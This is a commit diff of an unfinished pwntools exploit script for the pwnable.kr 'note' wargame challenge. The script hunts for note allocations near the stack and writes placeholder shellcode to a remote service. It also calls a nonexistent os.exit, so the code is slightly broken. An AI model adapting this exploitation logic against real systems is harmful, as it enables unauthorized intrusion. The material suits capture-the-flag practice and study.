37b2a050b64f85d114fb19bf7f935d26dac95c33
Raphael Ickovics <raphealickovics@gmail.com>
2022-04-20 14:20:47 -0700

    changed style to remove depencency on argh, have a plan for this

--- note/solve.py
+++ note/solve.py
@@ -1,68 +1,86 @@
+import os
 from pwn import *
-import argh
+import argparse
 
 
-context.log_level = 'debug'
-bin_path = './note'
-e = ELF(bin_path)
+context.log_level = 'info'
 
 
 ADDR = 'pwnable.kr'
 PORT = 9019
 
-
-gdbscript = '''
-layout regs
-continue
-'''
+BIN_PATH = './note'
+E = ELF(BIN_PATH)
 
 
-def start_gdb(exe_name):
-    return gdb.debug([exe_name], gdbscript=gdbscript)
-
-
-@argh.arg('--local', '-l', help='Run Locally')
-@argh.arg('--debug', '-d', help='Run Locally')
-@argh.arg('--runpwn', '-r', help='Run Remotly')
-def main(local=False, debug=False, runpwn=False):
-    p = None
-
-    if local:
-        p = process(bin_path)
-    elif debug:
-        p = start_gdb(bin_path)
-    elif runpwn:
-        p = remote(ADDR, PORT)
-    else:
-        log.critical('no run instruction given!!')
-        log.critical('shutting down...')
-        return
-
-    received_addrs = []
+def create_note_near_stack(p):
     while True:
         p.recvuntil('5. exit')
         p.sendline('1')
         p.recvuntil(' [')
         note_addr = int(p.recvuntil(']', drop=True), base=16)
-        if note_addr in received_addrs:
-            log.info('a note that was already in. prev_index: {}, curr_index: {}, addr: {}'.format(received_addrs.index(note_addr), len(received_addrs), note_addr))
-        else:
-            received_addrs.append(note_addr)
-
-        if -4096 < note_addr - 0xffffd000 < 0x1000:
-            log.info('addr: {}'.format(note_addr))
-            p.interactive()
+        if note_addr > 0xff500000:
+            log.info('found address close to stack:  0x{:08x}'.format(note_addr))
+            return note_addr
         else:
             p.recvuntil('5. exit')
             p.sendline('4')
             p.recvuntil('note no?\n')
-            p.sendline('0')
-    print(received_addrs)
+            p.sendline('1')
 
 
+def write_shellcode(p):
+    p.recvuntil('5. exit')
+    p.sendline('1')
+    p.recvuntil(' [')
+    shellcode_address = int(p.recvuntil(']', drop=True), base=16)
+    p.recvuntil('5. exit')
+    p.sendline('2')
+    p.recvuntil('note no?\n')
+    p.sendline('0')
+    p.sendline(p32(0x41414141) * 100)  # TODO: fix the shellcode
+    return shellcode_address
+
+
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('mode', choices=['local', 'debug', 'remote'])
+
+    return parser.parse_args()
+
+
+def start_process():
+    args = parse_args()
+    p = None
+
+    if args.mode == 'local':
+        log.info('running locally...')
+        p = process(BIN_PATH)
+    elif args.mode == 'debug':
+        log.info('debugging...')
+        p = gdb.debug([BIN_PATH], gdbscript='''
+layout regs
+continue
+'''
+        )
+    elif args.mode == 'remote':
+        log.info('pwning...')
+        p = remote(ADDR, PORT)
+    else:
+        log.critical('invalid option')
+        os.exit(1)
+    return p
+
+
+def main():
+    p = start_process()
+
+    shellcode_address = write_shellcode(p)
+    log.info('shellcode address is 0x{:08x}'.format(shellcode_address))
+    create_note_near_stack(p)
     p.interactive()
 
 
 if __name__ == '__main__':
-    argh.dispatch_command(main)
+    main()
 
